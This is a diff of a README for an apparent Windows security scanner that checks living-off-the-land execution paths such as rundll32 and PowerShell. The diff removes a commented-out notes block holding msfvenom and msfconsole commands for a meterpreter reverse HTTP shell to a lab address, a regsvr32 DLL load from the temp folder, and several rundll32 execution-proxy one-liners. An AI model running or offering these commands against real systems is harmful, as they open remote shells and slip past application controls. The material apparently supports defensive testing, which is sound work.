@@ -65,8 +65,6 @@ Powershell.exe | 4 | `Execute`
 ## To-Do
 - [ ] Export Report + JSON
 - [X] WinRM Exceptions
-<!-- 
-## Usage
 
 ## Limitations
 * Use Local Administrator Account
@@ -74,23 +72,3 @@ Powershell.exe | 4 | `Execute`
 * Recommended to use Cleanup with ErrorLevel
 * Recommended to put Cleanup before Verification for accurate result
 * Require user to manually close certain GUI Error Box so that scan can continue especially when antivirus is enabled (Rundll32)
-* Does not recommend customization, although available
-* All command behind an ampersand "&" will be passed into cmd.exe
-
-## Note
-```
-IF NOT EXIST %TEMP%\byol.dll EXIT 2
-Start-Process regsvr32 $env:TEMP\byol.dll
-
-msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.127.131 LPORT=4444 -f csharp
-sudo msfconsole -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_http;set LHOST 192.168.127.131;set LPORT 4444;run -j"
-(for /f "tokens=5" %a in ('netstat -ano ^| find ":4444" ') do taskkill /f /pid %a)
-
-regasm
-regsvcs
-rundll32.exe advpack.dll, #+12 calc.exe
-rundll32.exe zipfldr,RouteTheCall calc.exe
-rundll32.exe url,OpenURL file://c:\windows\system32\calc.exe
-rundll32.exe url.dll,FileProtocolHandler calc.exe
-```
- -->
